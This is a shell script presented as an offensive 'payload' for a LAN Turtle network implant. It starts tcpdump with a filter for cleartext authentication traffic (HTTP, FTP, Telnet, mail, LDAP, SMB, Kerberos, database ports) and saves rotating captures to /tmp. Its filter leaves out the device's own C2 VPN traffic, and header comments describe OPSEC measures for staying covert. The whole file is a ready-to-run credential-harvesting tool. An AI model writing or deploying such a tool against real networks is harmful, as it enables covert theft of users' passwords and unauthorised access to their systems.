#!/bin/sh
# ============================================================================
# PAYLOAD: cred-harvest.sh — Cleartext Credential Harvesting
# DEVICE:  LAN Turtle (Hak5) — OpenWrt / BusyBox ash
# PURPOSE: Capture cleartext credentials from target network traffic
# TOOLS:   tcpdump
# OPSEC:   Output to /tmp only. Excludes C2 traffic. Rotates captures.
#          Filters for authentication-bearing protocols only (low volume).
# ============================================================================

# --- Configuration -----------------------------------------------------------
OUTDIR="/tmp/creds"
IFACE="eth1"                          # Target-facing interface
MAXSIZE=2                             # MB per capture file
MAXFILES=5                            # Rotation count
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG="${OUTDIR}/harvest_${TIMESTAMP}.log"
PIDFILE="/tmp/cred-harvest.pid"

# BPF filter: cleartext auth protocols, exclude C2
# HTTP POST (passwords), FTP control, Telnet, SMTP auth,
# POP3, IMAP, LDAP, SNMP, Kerberos, SMB
BPF_FILTER="not (udp port 1194) and not (host 10.8.0.1) and not (port 22 and net 10.8.0.0/24) and ("
BPF_FILTER="${BPF_FILTER} (tcp port 80) or"        # HTTP
BPF_FILTER="${BPF_FILTER} (tcp port 8080) or"      # HTTP alt
BPF_FILTER="${BPF_FILTER} (tcp port 21) or"        # FTP
BPF_FILTER="${BPF_FILTER} (tcp port 23) or"        # Telnet
BPF_FILTER="${BPF_FILTER} (tcp port 25) or"        # SMTP
BPF_FILTER="${BPF_FILTER} (tcp port 110) or"       # POP3
BPF_FILTER="${BPF_FILTER} (tcp port 143) or"       # IMAP
BPF_FILTER="${BPF_FILTER} (tcp port 389) or"       # LDAP
BPF_FILTER="${BPF_FILTER} (udp port 161) or"       # SNMP
BPF_FILTER="${BPF_FILTER} (tcp port 445) or"       # SMB
BPF_FILTER="${BPF_FILTER} (udp port 88) or"        # Kerberos
BPF_FILTER="${BPF_FILTER} (tcp port 3306) or"      # MySQL
BPF_FILTER="${BPF_FILTER} (tcp port 5432)"         # PostgreSQL
BPF_FILTER="${BPF_FILTER} )"

# --- Functions ---------------------------------------------------------------
usage() {
    echo "Usage: $0 <start|stop|status>"
    echo ""
    echo "Captures cleartext credentials from target network traffic."
    echo "Filters: HTTP, FTP, Telnet, SMTP, POP3, IMAP, LDAP, SNMP,"
    echo "         Kerberos, SMB, MySQL, PostgreSQL"
    echo ""
    echo "Output: ${OUTDIR}/creds_*.pcap (rotating, ${MAXSIZE}MB x ${MAXFILES})"
    exit 1
}

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG"
}

start_harvest() {
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        log "Already running (PID $(cat "$PIDFILE"))"
        return 1
    fi

    mkdir -p "$OUTDIR"
    log "=== Credential Harvest Started ==="
    log "Interface: ${IFACE}"
    log "Max size: ${MAXSIZE}MB x ${MAXFILES} files"

    tcpdump -i "$IFACE" -nn -w "${OUTDIR}/creds_${TIMESTAMP}.pcap" \
            -C "$MAXSIZE" -W "$MAXFILES" \
            $BPF_FILTER \
            > /dev/null 2>&1 &

    echo $! > "$PIDFILE"
    log "tcpdump started (PID $!)"
}

stop_harvest() {
    if [ -f "$PIDFILE" ]; then
        _pid=$(cat "$PIDFILE")
        if kill -0 "$_pid" 2>/dev/null; then
            kill "$_pid"
            log "Harvest stopped (PID ${_pid})"
        else
            log "Process ${_pid} not running"
        fi
        rm -f "$PIDFILE"
    else
        log "No PID file found"
        # Fallback: kill any matching tcpdump
        _pid=$(pgrep -f "tcpdump.*creds_" 2>/dev/null)
        if [ -n "$_pid" ]; then
            kill "$_pid"
            log "Killed orphaned tcpdump (PID ${_pid})"
        fi
    fi
}

show_status() {
    echo "=== Credential Harvest Status ==="
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        echo "State: RUNNING (PID $(cat "$PIDFILE"))"
    else
        echo "State: STOPPED"
    fi
    echo ""
    echo "Capture files:"
    ls -lh "${OUTDIR}"/creds_*.pcap 2>/dev/null || echo "  (none)"
    echo ""
    echo "Total size:"
    du -sh "$OUTDIR" 2>/dev/null || echo "  0"
}

# --- Main --------------------------------------------------------------------
case "${1:-}" in
    start)
        start_harvest
        ;;
    stop)
        stop_harvest
        ;;
    status)
        show_status
        ;;
    *)
        usage
        ;;
esac
